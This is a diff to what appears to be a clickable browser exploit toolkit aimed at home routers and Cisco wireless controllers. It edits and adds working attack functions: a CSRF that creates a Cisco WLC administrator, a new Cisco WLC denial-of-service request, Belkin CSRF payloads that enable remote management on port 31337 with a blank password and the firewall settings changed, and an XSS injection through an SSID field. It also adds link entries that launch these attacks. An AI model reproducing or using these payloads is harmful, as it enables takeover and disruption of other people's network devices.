@@ -1608,8 +1608,9 @@ function netlog() {
 }
 
 // Cisco WLC 7.2.110.0 - Add Administrator CSRF
-function ciscowlc_addadmin(ip)
+function ciscowlc_addadmin()
 {
+	ip = prompt("IP: ")
     newuser = prompt("New User: ");
     passwd = prompt("New Password: ");
     form = '<input type="hidden" name="access_control" value="1"/>\
@@ -1620,6 +1621,14 @@ function ciscowlc_addadmin(ip)
 			<input type="hidden" name="buttonClicked" value="4"/>\
 			</form>';
 	post('https://' + ip + '/screens/aaa/mgmtuser_create.html', form);
+
+}
+
+function ciscowlc_dos()
+{
+	ip = prompt("IP: ")
+	url = ip + "/screens/base/web_auth_custom.html?&webauth_type=internal&buttonClicked=4";
+    document.location(url);
 
 }
 
@@ -2146,23 +2155,23 @@ form = '<input name="page" value="util_system"/>\
 
 function F5D8236_4v2_csrf_admin(ip){
 	ip = ip || "192.168.2.1";
-form = '<input type="hidden" name="remote_mgmt_enabled" value="1"/>\
-<input type="hidden" name="remote_mgmt_port" value="31337"/>\
-<input type="hidden" name="allow_remote_ip" value="0">';
+	form = '<input type="hidden" name="remote_mgmt_enabled" value="1"/>\
+	<input type="hidden" name="remote_mgmt_port" value="31337"/>\
+	<input type="hidden" name="allow_remote_ip" value="0">';
 	post('http://' + ip + '/cgi bin/system_setting.exe', form);
 }
 
 
 function N300_csrf_admin(ip){
 	ip = ip || "192.168.2.1";
-form = '<input type="hidden" name="location_page" value="system.stm"/>\
-<input type="hidden" name="remote_mgmt_enabled" value="1"/>\
-<input type="hidden" name="http_passwd" value=""/>\
-<input type="hidden" name="fw_disable" value="0"/>\
-<input type="hidden" name="EnableRgmt" value="on"/>\
-<input type="hidden" name="allow_remote_ip" value="0"/>\
-<input type="hidden" name="http_wanport" value="31337"/>\
-<input type="hidden" name="arc_action" value="Apply+Changes"/>';
+	form = '<input type="hidden" name="location_page" value="system.stm"/>\
+	<input type="hidden" name="remote_mgmt_enabled" value="1"/>\
+	<input type="hidden" name="http_passwd" value=""/>\
+	<input type="hidden" name="fw_disable" value="0"/>\
+	<input type="hidden" name="EnableRgmt" value="on"/>\
+	<input type="hidden" name="allow_remote_ip" value="0"/>\
+	<input type="hidden" name="http_wanport" value="31337"/>\
+	<input type="hidden" name="arc_action" value="Apply+Changes"/>';
 	post('http://' + ip + '/apply.cgi', form);
 }
 
@@ -2228,26 +2237,26 @@ function N900_xss_psk(ip)
 function N900_xss_ssid(ip)
 {
 	ip = ip || "192.168.2.1";
-xss = prompt("XSS:")
+	xss = prompt("XSS:")
 	form = '<input name="page" value="wl_channel">\
-<input name="wchan1" value="0">\
-<input name="ssid1" value="belkin.c86">\
-<input name="wbr1" value="9">\
-<input name="wl_nbw_cap1" value="0">\
-<input name="hidessid1" value="1">\
-<input name="protectmode1" value="0">\
-<input name="wmmenable1" value="1">\
-<input name="burstMode1" value="1">\
-<input name="wchan2" value="0">\
-<input name="ssid2" value="';
-form += xss;
-form += '">\
-<input name="wbr2" value="8">\
-<input name="wl_nbw_cap2" value="1">\
-<input name="hidessid2" value="1">\
-<input name="protectmode2" value="0">\
-<input name="wmmenable2" value="1">\
-<input name="burstMode2" value="1">';
+	<input name="wchan1" value="0">\
+	<input name="ssid1" value="belkin.c86">\
+	<input name="wbr1" value="9">\
+	<input name="wl_nbw_cap1" value="0">\
+	<input name="hidessid1" value="1">\
+	<input name="protectmode1" value="0">\
+	<input name="wmmenable1" value="1">\
+	<input name="burstMode1" value="1">\
+	<input name="wchan2" value="0">\
+	<input name="ssid2" value="';
+	form += xss;
+	form += '">\
+	<input name="wbr2" value="8">\
+	<input name="wl_nbw_cap2" value="1">\
+	<input name="hidessid2" value="1">\
+	<input name="protectmode2" value="0">\
+	<input name="wmmenable2" value="1">\
+	<input name="burstMode2" value="1">';
 	post('http://' + ip + '	/wl_chanel.html', form);
 }
 
@@ -2320,7 +2329,7 @@ var tmp = new Array();
 for (c=0;c<13;c+=2) {
    arrayMacs[a]=parseInt(q.charAt(c)+q.charAt(c+1), 16);
    tmp[a]=parseInt(q.charAt(c)+q.charAt(c+1), 16);
-a=a+1
+	a=a+1
 }
 
 	for (i=0;i<6;i++){
@@ -2367,6 +2376,7 @@ belkin.XXX         09:86:3B:XX:XX:XX    F9K1104   v1000
 @author         : e.novellalorente@student.ru.nl
 Original work   : ZhaoChunsheng 04/07/2012
 Javascript Port : @sinnet3000
+Requires: Long.js
 
 Advisory: http://ednolo.alumnos.upv.es/?p=1295
 
@@ -3122,6 +3132,13 @@ function belkinwpspin()
 </article>
 
 <article>
+	<div>12/13/12</div>
+	<div><a href="http://www.exploit-db.com/exploits/23361/">[+]</a></div>
+	<div><a href="javascript:ciscowlc_dos">Cisco WLC 7.2.110.0 - DOS</a></div>
+	<div><a href="javascript:ciscowlc_dos" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
 	<div>09/12/12</div>
 	<div><a href="http://www.exploit-db.com/exploits/23250/">[+]</a></div>
 	<div><a href="http://192.168.0.1:8080/filename.gw">Cisco DPC2420 - File Configuration Disclosure</a></div>
@@ -3131,8 +3148,8 @@ function belkinwpspin()
 <article>
 	<div>12/03/12</div>
 	<div><a href="http://www.exploit-db.com/exploits/23361/">[+]</a></div>
-	<div><a href="javascript:ciscowlc_addadmin(ip)">Cisco WLC 7.2.110.0 - Add Administrator CSRF</a></div>
-	<div><a href="javascript:ciscowlc_addadmin(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+	<div><a href="javascript:ciscowlc_addadmin()">Cisco WLC 7.2.110.0 - Add Administrator CSRF</a></div>
+	<div><a href="javascript:ciscowlc_addadmin()" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 
 
